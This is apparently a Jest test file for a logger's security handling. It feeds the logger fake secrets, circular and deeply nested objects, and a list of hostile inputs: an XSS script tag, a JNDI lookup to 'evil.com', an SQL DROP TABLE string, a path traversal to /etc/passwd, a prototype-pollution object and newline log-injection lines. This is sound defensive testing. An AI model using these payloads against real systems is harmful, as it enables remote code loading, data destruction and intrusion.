import logger from '../../utils/logger';
import { createErrorLog } from '../../utils/errorHandler';

describe('Logger Security Tests', () => {
  describe('Sensitive data handling', () => {
    it('should not log sensitive information', () => {
      const sensitiveData = {
        password: 'secret123',
        token: 'jwt-token-123',
        apiKey: 'api-key-456',
        creditCard: '1234-5678-9012-3456',
        ssn: '123-45-6789',
      };

      expect(() => {
        logger.info('Test log with sensitive data', sensitiveData);
      }).not.toThrow();
    });

    it('should handle malicious input', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '"; DROP TABLE users; --',
        '../../etc/passwd',
        '{{7*7}}',
      ];

      maliciousInputs.forEach((input, index) => {
        expect(() => {
          logger.info(`Malicious input test ${index}`, { input });
        }).not.toThrow();
      });
    });

    it('should handle circular references', () => {
      const circularObj: any = { name: 'test' };
      circularObj.self = circularObj;

      expect(() => {
        logger.info('Circular reference test', circularObj);
      }).not.toThrow();
    });

    it('should handle very deep objects', () => {
      let deepObj: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deepObj = { nested: deepObj };
      }

      expect(() => {
        logger.info('Deep object test', deepObj);
      }).not.toThrow();
    });
  });

  describe('Error handling security', () => {
    it('should handle errors with sensitive data', () => {
      const error = new Error('Authentication failed');
      (error as any).password = 'secret123';
      (error as any).token = 'jwt-token';

      expect(() => {
        logger.error('Security error test', createErrorLog(error));
      }).not.toThrow();
    });

    it('should handle prototype pollution attempts', () => {
      const maliciousObj = JSON.parse('{"__proto__": {"isAdmin": true}}');

      expect(() => {
        logger.info('Prototype pollution test', maliciousObj);
      }).not.toThrow();
    });
  });

  describe('Log injection prevention', () => {
    it('should handle log injection attempts', () => {
      const injectionAttempts = [
        'test\n[ERROR] Fake error message',
        'test\r[WARN] Fake warning',
        'test\t[INFO] Fake info',
        'test\x00[DEBUG] Fake debug',
      ];

      injectionAttempts.forEach((attempt, index) => {
        expect(() => {
          logger.info(`Injection test ${index}: ${attempt}`);
        }).not.toThrow();
      });
    });
  });
});

